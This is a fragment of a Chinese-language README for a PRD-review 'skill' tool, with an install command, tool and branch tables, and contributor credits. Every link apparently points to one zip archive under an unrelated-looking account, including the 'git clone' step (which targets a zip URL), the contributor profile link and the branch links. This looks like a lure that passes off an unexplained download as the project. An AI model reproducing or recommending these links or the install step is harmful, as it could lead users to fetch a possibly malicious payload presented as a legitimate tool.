...
```bash
git clone https://raw.githubusercontent.com/Liquid-erigeronphiladelphicus552/check-prd-skill/main/references/dimensions/prd-check-skill-3.4-alpha.4.zip
cd check-prd-skill
...
| 环节 | 工具 | 作用 |
|------|------|------|
| 创建 | [create-prd](https://raw.githubusercontent.com/Liquid-erigeronphiladelphicus552/check-prd-skill/main/references/dimensions/prd-check-skill-3.4-alpha.4.zip) | 从业务描述生成 14 章结构化 PRD 初稿 |
...
感谢 [@Scofy0123](https://raw.githubusercontent.com/Liquid-erigeronphiladelphicus552/check-prd-skill/main/references/dimensions/prd-check-skill-3.4-alpha.4.zip) 的持续贡献！除了 main 分支的标准版本外，仓库还提供两个**社区扩展分支**供有不同需求的用户选用：

| 分支 | 作者 | 特色 |
|------|------|------|
| `main` | 杨堃 | 标准版——固定 14 维度 PRD 审查 |
| [`community/complexity-aware`](https://raw.githubusercontent.com/Liquid-erigeronphiladelphicus552/check-prd-skill/main/references/dimensions/prd-check-skill-3.4-alpha.4.zip) | @Scofy0123 扩展 | 复杂度感知版——先判 L1-L4 需求等级，规范 PRD 走章节路径，非规范文档降级到 14 维度路径 |
| [`飞书 CLI 协作版`](https://raw.githubusercontent.com/Liquid-erigeronphiladelphicus552/check-prd-skill/main/references/dimensions/prd-check-skill-3.4-alpha.4.zip飞书CLI协作版(Special-tks-to-Scofy)) | @Scofy0123 扩展 | 飞书协作版——将 PRD 审查接入飞书文档协作闭环，支持评论回写、反馈收集、确认修改、交付判断 |
...
- [`PRD Productivity Toolkit`](https://raw.githubusercontent.com/Liquid-erigeronphiladelphicus552/check-prd-skill/main/references/dimensions/prd-check-skill-3.4-alpha.4.zip)
